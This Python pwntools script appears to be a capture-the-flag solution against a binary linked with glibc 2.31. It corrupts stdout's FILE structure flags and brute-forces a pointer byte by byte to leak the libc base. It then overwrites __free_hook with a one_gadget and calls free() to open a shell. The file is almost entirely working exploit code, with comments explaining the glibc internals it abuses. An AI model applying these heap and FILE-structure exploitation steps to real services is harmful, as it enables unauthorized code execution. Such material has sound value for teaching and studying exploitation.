from pwn import *

elf = ELF('./chall')
libc = ELF('./libc-2.31.so')

_IO_USER_BUF = 1 #/* User owns buffer; don't delete it on close. */
_IO_UNBUFFERED = 2
_IO_NO_READS = 4 #/* Reading not allowed */
_IO_NO_WRITES = 8 #/* Writing not allowd */
_IO_EOF_SEEN = 0x10
_IO_ERR_SEEN = 0x20
_IO_DELETE_DONT_CLOSE = 0x40 #/* Don't call close(_fileno) on cleanup. */
_IO_LINKED = 0x80 #/* Set if linked (using _chain) to streambuf::_list_all.*/
_IO_IN_BACKUP = 0x100
_IO_LINE_BUF = 0x200
_IO_TIED_PUT_GET = 0x400 # /* Set if put and get pointer logicly tied. */
_IO_CURRENTLY_PUTTING = 0x800
_IO_IS_APPENDING = 0x1000
_IO_IS_FILEBUF = 0x2000
_IO_BAD_SEEN = 0x4000
_IO_USER_LOCK = 0x8000

if args.GDB:
	p = gdb.debug(elf.path, '\n'.join([
		# "b *to_local_buf+78",
		"b *to_alloced_buf+67",
		# "b *to_stdout",
		# "b *to_devnull",
		"c",
		# "b *_IO_new_do_write"
	]))
elif args.REMOTE:
	p = remote("localhost", 9090)
else:
	p = process(elf.path) 


def send_option(opt, content):
	p.sendlineafter(b'> ', str(opt).encode())
	p.sendafter(b'> ', content)

def local(content):
	send_option(0, content)
	
def alloced(content):
	send_option(1, content)

def stdout(content):
	send_option(3, content)

def null(content):
	send_option(2, content)

def_flags = _IO_USER_BUF|_IO_IS_FILEBUF|_IO_LINKED|_IO_NO_READS
def construct_flags(flags):
	return p64(0xfbad0000 | flags)

# struct _IO_FILE
# {
# 		int _flags;		/* High-order word is _IO_MAGIC; rest is flags. */
# 		
# 		/* The following pointers correspond to the C++ streambuf protocol. */
# 		char *_IO_read_ptr;	/* Current read pointer */
# 		char *_IO_read_end;	/* End of get area. */
# 		char *_IO_read_base;	/* Start of putback+get area. */
# 		char *_IO_write_base;	/* Start of put area. */
# 		char *_IO_write_ptr;	/* Current put pointer. */
# 		char *_IO_write_end;	/* End of put area. */
# 		char *_IO_buf_base;	/* Start of reserve area. */
# 		char *_IO_buf_end;	/* End of reserve area. */
# 		
# 		/* The following fields are used to support backing up and undo. */
# 		char *_IO_save_base; /* Pointer to start of non-current get area. */
# 		char *_IO_backup_base;  /* Pointer to first valid character of backup area */
# 		char *_IO_save_end; /* Pointer to end of non-current get area. */
# 		
# 		struct _IO_marker *_markers;
# 		
# 		struct _IO_FILE *_chain;
# 		
# 		int _fileno;
# 		int _flags2;
# 		__off_t _old_offset; /* This used to be _offset but it's too small.  */
# 		
# 		/* 1+column number of pbase(); 0 is unknown. */
# 		unsigned short _cur_column;
# 		signed char _vtable_offset;
# 		char _shortbuf[1];
# 		
# 		_IO_lock_t *_lock;
# 		#ifdef _IO_USE_OLD_IO_FILE
# };

# stdout stops working if _IO_read_end is different than _IO_write_base (normally they are equal)
# we control the _IO_read_end so we can overwrite it byte by byte and check if stdout is still working
# if it is, we found the proper value of byte, so we can brute the next byte

# the logic responsible for printing or not is located in `new_do_write` func:
# 
# static size_t
# new_do_write(FILE *fp, const char *data, size_t to_do)
# {
# 	size_t count;
# 	if (fp->_flags & _IO_IS_APPENDING)
# 		/* On a system without a proper O_APPEND implementation,
# 		you would need to sys_seek(0, SEEK_END) here, but is
# 		not needed nor desirable for Unix- or Posix-like systems.
# 		Instead, just indicate that offset (before and after) is
# 		unpredictable. */
# 		fp->_offset = _IO_pos_BAD;
# 	else if (fp->_IO_read_end != fp->_IO_write_base)
# 	{
# 		off64_t new_pos = _IO_SYSSEEK(fp, fp->_IO_write_base - fp->_IO_read_end, 1);
# 		if (new_pos == _IO_pos_BAD)
# 			return 0;
# 		fp->_offset = new_pos;
# 	}
#   count = _IO_SYSWRITE (fp, data, to_do);

# my bet is that _IO_SYSSEEK will fail and _IO_SYSWRITE will not be called
# to get there _IO_IS_APPENDING must be unset, _IO_UNBUFFERED should be set to get output immediately
# _IO_NO_WRITES must be unset (first check in _IO_new_file_overflow)
# _IO_CURRENTLY_PUTTING must be set to skip copying read pointers to write pointers in _IO_new_file_overflow (see first method - solve.py)

flags = construct_flags(def_flags | _IO_CURRENTLY_PUTTING | _IO_UNBUFFERED) # 0xfbad2887
stdout(b'A')

leaked_bytes = []
for byte_idx in range(8):
	print(f'Leaking byte{byte_idx}...')
	p.clean()
	for i in range(0, 0x100):
		if i == ord('\n'): continue # this will mess up readline

		p.sendline(b'1')
		p.clean()
		p.sendline(flags + b'\x00'*8 + b''.join(leaked_bytes) + p8(i))
		data = p.clean()
		
		if len(data) > 20:
			print(f'byte{byte_idx} = {hex(i)}')
			leaked_bytes.append(p8(i))
			break

	if len(leaked_bytes) != byte_idx + 1:
		print(f"byte{byte_idx} not found :(")
		exit(1)

leak = u64(b''.join(leaked_bytes).ljust(8, b'\x00'))
print(f'[+] _IO_write_base = {hex(leak)}')
libc.address = leak - 0x1ec723

free_hook = libc.symbols['__free_hook']
print(f'[+] base addr {hex(libc.address)}')
print(f'[+] free_hook {hex(free_hook)}')

p.unrecv(b'> ')   # we consumed it during the bruteforcing
# `free()` will be called in fputs with our data, so set free_hook to one_gadget
local(b'\x00'*0x18 + p64(free_hook)[:7])
alloced(p64(libc.address + 0xe6c7e) + b'\n')

# trigger free (fputs)
null(b'd00pa\n')

# another idea is to set free_hook to system and pass /bin/sh to fputs
p.interactive()
